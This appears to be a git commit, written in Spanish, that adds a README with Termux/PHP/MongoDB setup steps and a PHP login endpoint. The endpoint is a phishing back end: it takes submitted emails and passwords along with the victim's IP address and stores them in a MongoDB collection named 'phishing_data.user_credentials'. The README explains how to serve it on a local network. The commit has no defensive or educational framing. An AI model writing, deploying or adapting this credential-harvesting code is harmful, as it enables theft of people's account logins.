7eb2778069f7d7f9f31f7052d99fc6d646446ce3
CHICO-CP <ma8598008@gmail.com>
2025-01-22 18:59:43 -0600

    Automated commit: Subiendo actualización de archivos

---
+++ README.md
@@ -0,0 +1,40 @@
+## Comandos
+```bash
+pkg update
+```
+```bash
+pkg install php
+```
+```bash
+pkg install php-mongodb
+```
+
+## Instala composter
+
+```bash
+pkg install php-composer
+```
+
+## Instala MongoDB para PHP
+
+```bash
+composer require mongodb/mongodb
+```
+
+# Para iniciar el servidor debes ejecutar este comando
+
+```bash
+php -S 0.0.0.0:8080
+```
+
+# De allí vas a haceder a la url
+
+```bash
+http://<tu_ip_local>:8080
+```
+
+# También puede ser
+
+```bash
+http://localhost:8080
+```
---
+++ api/login.php
@@ -0,0 +1,32 @@
+<?php
+
+// Cargar la librería de MongoDB
+require 'vendor/autoload.php';
+
+// URI de conexión a MongoDB Atlas
+$uri = "mongodb+srv://<usuario>:<contraseña>@<cluster>.mongodb.net/?retryWrites=true&w=majority";
+
+// Conectar a MongoDB
+$client = new MongoDB\Client($uri);
+$collection = $client->phishing_data->user_credentials;
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Capturar la IP
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    // Crear un documento para MongoDB
+    $document = [
+        'email' => $email,
+        'password' => $password,
+        'ip' => $ip,
+        'date' => new MongoDB\BSON\UTCDateTime()
+    ];
+
+    // Insertar el documento en MongoDB
+    $collection->insertOne($document);
+
+}
+?>
